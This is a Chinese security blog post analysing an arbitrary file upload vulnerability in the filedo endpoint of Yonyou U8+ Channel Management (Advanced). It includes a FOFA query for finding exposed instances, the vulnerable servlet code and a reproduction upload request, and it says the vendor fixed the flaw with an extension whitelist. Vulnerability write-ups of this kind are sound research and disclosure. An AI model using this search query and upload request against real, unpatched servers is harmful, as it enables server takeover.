---
title: "用友U8+渠道管理(高级版) filedo 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-filedo-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-filedo-文件上传漏洞
---

# 用友U8+渠道管理(高级版) filedo 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/22 08:08
- 781浏览
- [0评论](#comment)
- 1小时阅读

深入探索

安全工具开发

网络安全会议

网络安全培训

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `filedo` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞修复方案

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadServlet` 在那里引用了

深入探索

漏洞扫描器

安全研究工具

计算机安全

```
<servlet>
    <servlet-name>UploadServlet</servlet-name>
    <servlet-class>com.gxfcsoft.framework.core.UploadServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>UploadServlet</servlet-name>
    <url-pattern>*.filedo</url-pattern>
</servlet-mapping>
```

ok，根据servlet的映射，任意以`.filedo` 结尾的请求都会经由`UploadServlet` 处理，跟进看下它的实现逻辑

```
package com.gxfcsoft.framework.core;

import com.alibaba.fastjson.JSONObject;
import com.gxfcsoft.framework.base.util.Oid;
import com.gxfcsoft.framework.base.util.PathUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.ProgressListener;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UploadServlet extends HttpServlet {
    private static final long serialVersionUID = -298116318701283790L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String savePath = PathUtil.getAttachAbsoluteDirectory("default");
        String newname = "";
        String oldname = "";
        String message = "1";
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html;charset=utf-8");
        PrintWriter outPrint = resp.getWriter();

        try {
            File saveFile = new File(savePath);
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(102400);
            factory.setRepository(saveFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setProgressListener(new ProgressListener() {
                public void update(long arg0, long arg1, int arg2) {
                }
            });
            upload.setHeaderEncoding("UTF-8");
            upload.setFileSizeMax(5242880L);
            upload.setSizeMax(20971520L);
            List<FileItem> list = upload.parseRequest(req);
            if (list.size() == 0) {
                message = "500";
            }

            String code = "";
            JSONObject obj = new JSONObject();
            List<Map<String, String>> lists = new ArrayList();
            Map<String, String> map = new LinkedHashMap();

            for(FileItem item : list) {
                if (item.isFormField()) {
                    code = item.getString("utf-8");
                } else {
                    String filename = item.getName();
                    filename = filename.substring(filename.lastIndexOf("\\") + 1);
                    String suffix = filename.substring(filename.indexOf("."));
                    String randomName = Oid.getOid() + suffix;
                    if (newname == "") {
                        newname = randomName;
                    } else {
                        newname = newname + ";" + randomName;
                    }

                    if (oldname == "") {
                        oldname = filename;
                    } else {
                        oldname = oldname + ";" + filename;
                    }

                    savePath.replace("", "");
                    InputStream in = item.getInputStream();
                    FileOutputStream out = new FileOutputStream(savePath + "\\" + randomName);
                    byte[] buffer = new byte[1024];
                    int len = 0;

                    while((len = in.read(buffer)) > 0) {
                        out.write(buffer, 0, len);
                    }

                    in.close();
                    out.close();
                    item.delete();
                }
            }

            map.put("oldname", oldname);
            map.put("newname", newname);
            lists.add(map);
            obj.put("fileInfo", lists);
            obj.put("flag", "0");
            outPrint.print(obj);
        } catch (IOException e) {
            message = "1";
            e.printStackTrace();
        } catch (FileUploadException e) {
            message = "1";
            e.printStackTrace();
        } finally {
            outPrint.flush();
            outPrint.close();
        }

    }
}
```

文件后缀从上传文件名中获取，然后拼接到`randomName`后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！和[U8+渠道管理(高级版) imagedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html)一模一样的漏洞成因！

漏洞修复方案

其实 **UploadTestServlet** 也存在同样的任意文件上传漏洞，不过需要合法session

```
    <!-- 上传图片，应该作废此方法 -->
    <servlet>
        <servlet-name>UploadTestServlet</servlet-name>
        <servlet-class>com.gxfcsoft.framework.core.UploadTestServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>UploadTestServlet</servlet-name>
        <url-pattern>/business/test/upload.imgdo</url-pattern>
    </servlet-mapping>
```

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-002-ead9ab1959d9.webp)](https://image.mrxn.net/ebf66d0d6b2a4918a38e2d7934cde93a.webp)

补丁修复也是正则白名单检测

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-003-7e0a7c397b8f.webp)](https://image.mrxn.net/a6fcda8bca9f4b36b941ab31d1d38af4.webp)

# 漏洞复现

```
POST /temp.filedo HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-004-84aa7066cbdb.webp)](https://image.mrxn.net/8fb74229788e43c2b10ac708839dadc4.webp)

根据**getAttachAbsoluteDirectory**方法可知

漏洞修复方案

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-005-c1cf252dc977.webp)](https://image.mrxn.net/236b1c1367524a398658a853f084a324.webp)

上传位置默认为 `/userfile/default/attach/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-006-8127bc12fee9.webp)](https://image.mrxn.net/d89bcdc2bc73461198e4221fdf1230ab.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-007-e7e94b4cb59f.webp)](https://image.mrxn.net/042146d5377b46a3b374769987919d1f.webp)

# 参考

- [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
- <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKi0lEQVR4Aeyd0XojqQ6E8+/7v/McF0qBDDRub+y4zw77RS6pVBIENbZn5mL/+fr6+vNT+3Piv7yG5Zmz75xwxonPZk3GnLfvvONHaH3GVU3W/cTXQG71++cqJ1AHcpv+1zM2+wWAL+AuBRQu974TfAfOQ+iB70wDoPSChi17u+p//pTfIXMQ2ll/iNxK7zph1q18aZ+x3KsOJJPb/9wJDAOBeGpgjv92q9D6uUd+isxldB6iNufsWyM0l1G8zJx8mzmI/kC5YcpD42Y6iLxzM4TQwBxnNcNAZqLN/d4J7IH83lmfWuktA4F2Rb0LvQ3YzMGocy5jX6fcjIPWD8KXVgb3sbiVub/QOvm9OfcqfMtAXrW5v7HP2wfiJwriCQWm5wyUr7Q5CcFB4CyXuZW/2odzQhjXWvV9de49A3n1Lv+ifnsgFxv2MBBd25Wd2X+uh+O3gKyzn/ubM+acfYj+gKklulfGZcEtCRy+nd7Shz95jZk/KxwGMhNt7vdOoA4E4imAc/jsFvMTArFG7gHBPdK5xjrHwhknXgbRX74NRs65nyBEXziHea06kExu/3MnsAfyubOfrvyPr/lP0J3dA9pVdS6jdTMOWq11EFzWw8jlfO/3vYBe8lTsfi5y/FPcN8QnehEcBgKUr3jAdItAzcPcnxY+ICF65SdsVWLdTOOcEKLvSgehAWay+lfyOQncncMqB/dauI9z7TCQnLyY/1dspw4EYmr5t4bgoKHzevpsPedY2GvEQfSTvzII3azHmTpo/+C00s9yEGvDHF3jvUHT9TlrhM4JFcug1daBSLDt8yewB/L5Gdzt4B+I62JWV6g354TOQdQBog8NKB9+WbDqAaEHcknxXScESl/5tiLqXiB0EGitEILrSkqofG8l8f3i3Hc4BYj+0HAqTOS+IekwruDWPxh6M9CmCeH7aRDCyPW10vVmjRDGHr1esbQyCD00FC+DxkH4qu1N2t6s6fk+huibebjn3EtonXzbjIP7HtLsG6JTuJDtgVxoGNrK8KEusjeIqwXUFFA+VIHK9dezJjrHOqD2gNG3zuWOheYyipdlDqKveBlEDA3F95Z79DnFOS8fxn7ibaqROT7CfUOOTuZDfP1Q1/Rks32ItznvWGgO2lMCx771qu3NuYzWQOtpLuvsQ9P1nONHCGOPRzXOQ9Q6FsLIzX6HfUN0WheyPZALDUNbGQbia5QR4roBqikG1A/kQtxeXHNzhx/nhNBqIfyh4EbAfU61NrjP3eT1x5qMNTlxIHoBk+yaAso5ZJXXzZx9CD1g6g6Hgdxld/DrJ1C/9gLDpFe78VOQEaJH5s72gKjNevfJnP1VzppH6B4ZXTPjIPYIWHYacz/7s+J9Q2an8kFuD+SDhz9bevhzCFDeuoCq9xUTmgSqDsJXXgYRQ/sXO2ice8xQ9bY+D2MPa4XWw1onrWymh6h1LqNqesv5lQ/HfXPdviH5NF7n/+tOdSAQE8xPAAQ365519uFYP+sBoYd2k7IOWh6aRutlnX0IvWMhBAcjKt+besug6a2BxkH4zmWEMaeeMogcNMy1dSCZ3P7nTqB+7fUWYJwcNE5TlkHjIHz3UN5mbobWCCF6QEPxslkthG6WU42tz5sXwtgDglPe1vdQ7JxRXG8QvYA+VeJZ7b4h5Wiu87IHcp1ZlJ0MX3t9jYRFcXuRb7uF5cexsBC3F/ky4PArsfI3afmBpivEgxdoevWRQeNm5dJkg1Gf8+4Bax20POCygrmffaCciWMhjNy+IeUIr/NyaiAQk4Q5+teByDt+hHpKbNY6FsJz/dwDog5GtCYjNJ3WleW8fRh10sqseQZVJ4PW99RAnllka392AnsgPzu/l1fXP4dAuzYQvq6TLK+q+BnLtfZd7/gIVzqIPebamd7cDHOtfYi+We9cRggdBM5ymTvr7xty9qR+Sbf82gsx/fy0QHDQ0HuF4BwLXSu/Nwg9UFNA+XoIVM49Mjo545z7N+h+uRYoe8qcdTO0DqIO2t/DQeOsy7hvSD6NC/h7IBcYQt7C8kPdQhivWb6q1plzLIRWC+GLl1kvVNwb3Ov7vGIIDaCwmPrZgPJ2AyNaU4q+XyB032GBlQ5CDw1n+tLo9uKcEKLmRteffUPqUVzDqQPRxGR5W4qPDGK6QC0BytNYieTkPqYh9ICpKQIv65v3AdE3c9MNfJNndTD2heC+Wx1CHcihYid+9QTqQCAmmJ8CCC7vCILLOufNOc4IUQdU2nphJRcOUG4KtK+RWQ6Rz5x9rSFzLFQsg6iD1hcaB6Ovumzq96y5PtfVgWTyvf7uvjqBPZDV6XwgV/+kvlob2pX1NYPG9bVwnOu1q9hrWeNYaA6eWwuaHsJ3LyEEpzV6U/7Ieq1iiF5ALQPq224lk7NvSDqMK7h1IJqo7NGmICYsra2vMX+EED2gYd9DMURe/pHN1sha5+Fxr1z3yIfoB4FZD8F5baHz8m3mMtaBZHL7nzuBPZDPnf105fp3WdPsgoS4ltDQclhzvrIZXZu53rcmI4xr5fwZP6+z0s905qDtw1zuNeMgarJu35B8GhfwT33t9XSF3rN8m7kZwvgUQHDQ8JleQF3KdUKgfKWsyR84EL2gYW6n9WSZsw9R41gIwUFD1cuUt/1nboh/of933AO52ATrhzq0qwThe68QMWCqvDUABSv57ega9vadeggQPYGqBYZ1IDho2K+pGCLvZuJs5mZoTUaIXjBi1p3tN9PtGzI7lQ9y9UPdE57txbkjdA3Ek+P4EeZ+1j7inJ/pIdaHhtatENZ6iLzXFrqffBmEBtZ/he86IUSN6m37huhkLmR7IBcahrYyfKj76gglkEFcLUBhMaB80EK7oqqRFcGJF2g9IPxZGYw5rSODyMG4D+XdT77MsVBxb+J7s6bnFUOsL98GI+dcxlnffUPyCV3AX36oe4IZvecZB8dPxkw/49xfCMf94HEOUJtDA+oth/APxbcEhAa4RfGTf4feD8X9K1DXdAYat2+IT2WKv08OnyHQpgXn/NW2YezhJ2lWB03vvPVwnJMGIi/f5h4QOWjYa6Q1B00H4TsnlDYbhAbI9NP+viFPH9l7C/ZA3nu+T3evA9E1fMZWKwH1g8s9V/qcsz6j8zPOOaHz8m3mZgixz5yb1ZmD0AOmKs561GRyHunqQFLNdj94AsNAgPp0w+iv9pqnb996x0KIvs4Jxcvk2+BeBxEDliz3Ck1XCyYOsOwzKakUHNdW0QNHv7dtGMiD2p1+8wnsgbz5gJ9t/5aBwPE1BuoegeGtoiaTA6HztRam9OAqbxuSLyLcf4arJSB+F5jjWway2tDOfX2tzuClA4GY+mpB5WZPlTmIHoCkxZwrwYkXoN68E/I7yWot54QugljLsVB5mfzexNv6nOKXDkQNt/3sBPZAfnZ+L68eBuLrdISrHcxqrM85c4/QNTOdcxmtyxzcv6VAxIDl9f91qzqT8ntzTgiUt0VrIGJA6WLOCQvRvYjvbRhIV7PDXz6BOhCgTBzO4Wqf0HpYB42D0bcuPzHmVgitl3VwzFkj9FrybRC1jjNC5IBKA+Xc3EvoJEQOMDVFoPQAvupAvvZ/lziBPZBLjKFt4n8AAAD//wi3oyoAAAAGSURBVAMAIVI6p6zPsdkAAAAASUVORK5CYII=)

手机扫码阅读
